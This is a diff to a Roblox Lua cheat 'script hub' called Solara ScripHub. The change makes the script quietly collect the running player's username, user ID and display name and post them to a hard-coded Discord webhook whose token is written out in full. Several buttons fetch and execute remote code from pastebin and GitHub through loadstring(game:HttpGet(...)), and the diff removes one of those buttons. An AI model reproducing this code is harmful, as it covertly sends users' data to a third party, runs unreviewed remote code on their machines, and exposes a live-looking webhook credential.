@@ -1,21 +1,24 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local HttpService = game:GetService("HttpService")
 
 local WebhookURL = "https://discord.com/api/webhooks/1267324391490981958/xw8GIxG1kCp772OUPXhQJH6foWEQh36kF87Phv2hecJLw5DjchbPq7P4GKUyj6mPKPZC"
 
 -- Function to send data to the Discord webhook
 local function sendWebhook(content)
-    local httpService = game:GetService("HttpService")
     local data = {
         ["content"] = content
     }
-    local jsonData = httpService:JSONEncode(data)
-    httpService:PostAsync(WebhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
+    local jsonData = HttpService:JSONEncode(data)
+    HttpService:PostAsync(WebhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
 end
 
--- Gather user information
+-- Gather user information and send to webhook
 local player = game.Players.LocalPlayer
 local userInfo = "Username: " .. player.Name .. "\nUser ID: " .. player.UserId .. "\nDisplay Name: " .. player.DisplayName
 sendWebhook(userInfo)
+
+-- Continue with the rest of your script
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
     Name = "Solara ScripHub",
@@ -182,14 +185,6 @@ local Button = Tab:CreateButton({
     Callback = function()
         -- The function that takes place when the button is pressed
         loadstring(game:HttpGet("https://raw.githubusercontent.com/7hbl/lqmc-da-hood/main/lqmc%20da%20hood"))();
-    end
-})
-
-local Button = Tab:CreateButton({
-    Name = "Fake Macro [Press Q]",
-    Callback = function()
-        -- The function that takes place when the button is pressed
-        loadstring(game:HttpGet("https://pastebin.com/raw/QW5Whap9"))()
     end
 })
 
